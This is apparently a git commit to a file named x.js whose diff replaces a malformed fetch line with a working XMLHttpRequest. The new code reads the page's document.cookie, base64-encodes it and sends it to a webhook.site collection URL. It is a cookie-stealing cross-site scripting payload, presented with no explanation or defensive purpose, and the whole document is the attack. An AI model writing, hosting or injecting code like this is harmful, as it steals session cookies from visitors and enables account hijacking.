76fd53b97cb5793489bdea0e56af9310d2d9cbf6
T00mm <3200970+T00mm@users.noreply.github.com>
2024-12-11 14:27:21 +0100

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,3 @@
-fetch('https://webhook.site/2a8e6fb4-33ac-4efa-96f0-937395817b97/'?data=+ btoa(document.cookie));
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/2a8e6fb4-33ac-4efa-96f0-937395817b97/?' + btoa(document.cookie), true);
+xhttp.send();
